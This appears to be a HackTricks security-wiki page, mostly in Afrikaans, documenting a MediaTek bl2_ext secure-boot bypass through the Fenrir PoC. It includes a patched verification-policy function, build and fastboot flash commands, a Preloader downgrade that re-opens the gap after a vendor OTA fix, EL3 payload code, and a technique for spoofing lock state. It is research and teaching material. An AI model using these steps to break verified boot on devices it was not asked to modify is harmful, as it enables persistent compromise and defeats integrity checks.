# MediaTek bl2_ext Secure-Boot Bypass (EL3 Code Execution)

{{#include ../../banners/hacktricks-training.md}}

Hierdie blad dokumenteer 'n praktiese ondermyning van secure-boot op verskeie MediaTek-platforms deur 'n verifiëringsgaping uit te buit wanneer die toestel se bootloader-konfigurasie (seccfg) op "unlocked" gestel is. Die fout maak dit moontlik om 'n gepatchede bl2_ext op ARM EL3 uit te voer om downstream signature verification uit te skakel, die chain of trust te laat ineenstort en arbitêre unsigned TEE/GZ/LK/Kernel-lading moontlik te maak.

> Waarskuwing: Vroeë-boot patching kan toestelle permanent brick as offsets verkeerd is. Hou altyd volledige dumps en 'n betroubare herstelpad.

## Aangetaste opstartvloei (MediaTek)

- Normale pad: BootROM → Preloader → bl2_ext (EL3, verified) → TEE → GenieZone (GZ) → LK/AEE → Linux kernel (EL1)
- Kwetsbare pad: Wanneer seccfg op "unlocked" gestel is, kan Preloader die verifikasie van bl2_ext oorslaan. Preloader spring nog steeds in bl2_ext by EL3, dus 'n gemaakte bl2_ext kan daarna ongeverifieerde komponente laai.

Belangrike vertrouensgrens:
- bl2_ext loop op EL3 en is verantwoordelik vir die verifikasie van TEE, GenieZone, LK/AEE en die kernel. As bl2_ext self nie geauthentiseer is nie, kan die res van die ketting triviaal omseil word.

## Oorsaak

Op aangetasde toestelle dwing die Preloader nie die verifikasie van die bl2_ext-partisie af wanneer seccfg 'n "unlocked"-toestand aandui nie. Dit maak dit moontlik om 'n deur 'n aanvaller beheerde bl2_ext te flash wat by EL3 loop.

Binne bl2_ext kan die verification policy-funksie gepatch word om onvoorwaardelik te rapporteer dat verifikasie nie vereis word nie. 'n Minimale konseptuele patch is:
```c
// inside bl2_ext
int sec_get_vfy_policy(...) {
return 0; // always: "no verification required"
}
```
Met hierdie verandering word alle daaropvolgende images (TEE, GZ, LK/AEE, Kernel) aanvaar sonder kriptografiese kontroles wanneer dit deur die gepatchte bl2_ext wat by EL3 loop gelaai word.

## Hoe om 'n teiken te triageer (expdb logs)

Dump/inspect opstartlogs (bv. expdb) rondom die bl2_ext-laai. As img_auth_required = 0 en sertifikaatverifikasietyd ongeveer 0 ms is, is afdwinging waarskynlik af en is die toestel uitbuitbaar.

Example log excerpt:
```
[PART] img_auth_required = 0
[PART] Image with header, name: bl2_ext, addr: FFFFFFFFh, mode: FFFFFFFFh, size:654944, magic:58881688h
[PART] part: lk_a img: bl2_ext cert vfy(0 ms)
```
Nota: Sommige toestelle sou volgens berigte bl2_ext-verifikasie oorslaan selfs met 'n vergrendelde bootloader, wat die impak vererger.

Toestelle wat met die lk2 sekondêre bootloader verskaf word, is waargeneem met dieselfde logika-gaping, dus haal expdb-logs vir beide bl2_ext- en lk2-partisies om te bevestig of enigeen van die paaie handtekeninge afdwing voordat jy met porting begin.

As 'n post-OTA Preloader nou img_auth_required = 1 vir bl2_ext log, selfs terwyl seccfg ontgrendel is, het die verskaffer waarskynlik die gaping toegewerk — sien die OTA-persistensie-notas hieronder.

## Praktiese uitbuitings-werkvloei (Fenrir PoC)

Fenrir is 'n referensie exploit/patching toolkit vir hierdie soort probleem. Dit ondersteun Nothing Phone (2a) (Pacman) en is bekend werkend (slegs onvolledig ondersteun) op CMF Phone 1 (Tetris). Om na ander modelle te port, vereis reverse engineering van die toestel-spesifieke bl2_ext.

Hoëvlak proses:
- Verkry die toestel se bootloader-beeld vir jou doel-codenaam en plaas dit as `bin/<device>.bin`
- Bou 'n gepatchede beeld wat die bl2_ext verifikasiebeleid deaktiveer
- Flits die resulterende payload na die toestel (fastboot word deur die helper-skrip veronderstel)

Opdragte:
```bash
# Build patched image (default path bin/[device].bin)
./build.sh pacman

# Build from a custom bootloader path
./build.sh pacman /path/to/your/bootloader.bin

# Flash the resulting lk.patched (fastboot required by the helper script)
./flash.sh
```
If fastboot is unavailable, you must use a suitable alternative flashing method for your platform.

### OTA-gepatchte firmware: die bypass lewendig hou (NothingOS 4, laat 2025)

Nothing het die Preloader in die November 2025 NothingOS 4 stabiele OTA (build BP2A.250605.031.A3) gepatch om bl2_ext-verifikasie af te dwing selfs wanneer seccfg ontgrendel is. Fenrir `pacman-v2.0` werk weer deur die kwesbare Preloader van die NOS 4 beta met die stabiele LK payload te meng:
```bash
# on Nothing Phone (2a), unlocked bootloader, in bootloader (not fastbootd)
fastboot flash preloader_a preloader_raw.img   # beta Preloader bundled with fenrir release
fastboot flash lk pacman-fenrir.bin            # patched LK containing stage hooks
fastboot reboot                                # factory reset may be needed
```
Belangrik:
- Flash die voorsiene Preloader **slegs** na die ooreenstemmende device/slot; 'n verkeerde Preloader is 'n instant hard brick.
- Kontroleer expdb na flashing; img_auth_required behoort terug te val na 0 vir bl2_ext, wat bevestig dat die kwesbare Preloader uitgevoer word voordat jou gepatchte LK.
- As toekomstige OTAs beide Preloader en LK patch, hou 'n plaaslike kopie van 'n kwesbare Preloader om die gaping weer te herintroduceer.

### Build automation & payload debugging

- `build.sh` now auto-downloads and exports the Arm GNU Toolchain 14.2 (aarch64-none-elf) die eerste keer wat jy dit hardloop, sodat jy nie met cross-compilers handmatig hoef te jongleer nie.
- Export `DEBUG=1` voordat jy `build.sh` invoke om payloads met verbose serial prints te compile, wat grootliks help wanneer jy blind-patching van EL3 code paths doen.
- Successful builds drop beide `lk.patched` en `<device>-fenrir.bin`; laasgenoemde het die payload reeds geïnjekteer en is wat jy behoort te flash/boot-test.

## Runtime payload capabilities (EL3)

A patched bl2_ext payload can:
- Registreer custom fastboot commands
- Control/override boot mode
- Dynamically call built‑in bootloader functions at runtime
- Spoof “lock state” as locked while actually unlocked to pass stronger integrity checks (some environments may still require vbmeta/AVB adjustments)

Beperking: Current PoCs merk dat runtime memory modification moontlik fault weens MMU constraints; payloads vermy gewoonlik live memory writes totdat dit opgelos is.

## Payload staging patterns (EL3)

Fenrir splits its instrumentation into three compile-time stages: stage1 runs before `platform_init()`, stage2 runs before LK signals fastboot entry, and stage3 executes immediately before LK loads Linux. Elke device header onder `payload/devices/` verskaf die adresse vir hierdie hooks plus fastboot helper symbols, so hou daardie offsets gesinchroniseer met jou target build.

Stage2 is 'n geskikte plek om arbitrêre `fastboot oem` verbs te registreer:
```c
void cmd_r0rt1z2(const char *arg, void *data, unsigned int sz) {
video_printf("r0rt1z2 was here...\n");
fastboot_info("pwned by r0rt1z2");
fastboot_okay("");
}

__attribute__((section(".text.main"))) void main(void) {
fastboot_register("oem r0rt1z2", cmd_r0rt1z2, true, false);
notify_enter_fastboot();
}
```
Stage3 demonstreer hoe om page-table attributes tydelik te flip om onveranderlike stringe, soos Android’s “Orange State” warning, te patch sonder dat downstream kernel access nodig is:
```c
set_pte_rwx(0xFFFF000050f9E3AE);
strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");
```
Omdat stage1 afgevuur word voordat die platform bring-up plaasvind, is dit die regte plek om na OEM power/reset primitives te roep of om addisionele integriteits-logging in te voeg voordat die verified boot chain afgebreek word.

## Wenke vir portering

- Reverse engineer the device-specific bl2_ext to locate verification policy logic (e.g., sec_get_vfy_policy).
- Identifiseer die policy return site of decision branch en patch dit na “no verification required” (return 0 / unconditional allow).
- Hou offsets volledig apparaat- en firmware-spesifiek; moenie adresse tussen variante hergebruik nie.
- Valideer eerstens op ’n offer-eenheid. Berei ’n herstelplan voor (bv. EDL/BootROM loader/SoC-specific download mode) voordat jy flash.
- Toestelle wat die lk2 secondary bootloader gebruik of wat “img_auth_required = 0” vir bl2_ext rapporteer selfs al is hulle gegrendel, moet as kwesbare kopieë van hierdie foutklas behandel word; Vivo X80 Pro is reeds waargeneem wat verification oorslaan ondanks ’n gerapporteerde lock state.
- Wanneer ’n OTA begin om bl2_ext-handtekeninge af te dwing (img_auth_required = 1) in die ontgrendelde toestand, kyk of ’n ouer Preloader (dikwels beskikbaar in beta OTAs) geflash kan word om die gaping weer te heropen, en voer dan fenrir weer uit met bygewerkte offsets vir die nuwer LK.

## Sekuriteitsimpak

- EL3 kode-uitvoering na die Preloader en volle chain-of-trust-instorting vir die res van die boot-pad.
- Vermoë om unsigned TEE/GZ/LK/Kernel te boot, wat secure/verified boot-verwagtinge omseil en volgehoue kompromie moontlik maak.

## Toestelnotas

- Bevestigde ondersteuning: Nothing Phone (2a) (Pacman)
- Bekend werkend (onvolledige ondersteuning): CMF Phone 1 (Tetris)
- Waargeneem: Daar is gerapporteer dat Vivo X80 Pro bl2_ext nie geverifieer het nie, selfs toe dit gegrendel was
- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) het bl2_ext-verifikasie weer geaktiveer; fenrir `pacman-v2.0` herstel die omseiling deur die beta Preloader plus gepatchte LK te flash soos hierbo getoon
- Industriële dekking beklemtoon addisionele lk2-gebaseerde verskaffers wat dieselfde logika-fout lewer, so verwag verdere oorvleueling oor 2024–2025 MTK releases.

## References

- [Fenrir – MediaTek bl2_ext secure‑boot bypass (PoC)](https://github.com/R0rt1z2/fenrir)
- [Cyber Security News – PoC Exploit Released For Nothing Phone Code Execution Vulnerability](https://cybersecuritynews.com/nothing-phone-code-execution-vulnerability/)
- [Fenrir pacman-v2.0 release (NothingOS 4 bypass bundle)](https://github.com/R0rt1z2/fenrir/releases/tag/pacman-v2.0)
- [The Cyber Express – Fenrir PoC breaks secure boot on Nothing Phone 2a/CMF1](https://thecyberexpress.com/fenrir-poc-for-nothing-phone-2a-cmf1/)

{{#include ../../banners/hacktricks-training.md}}
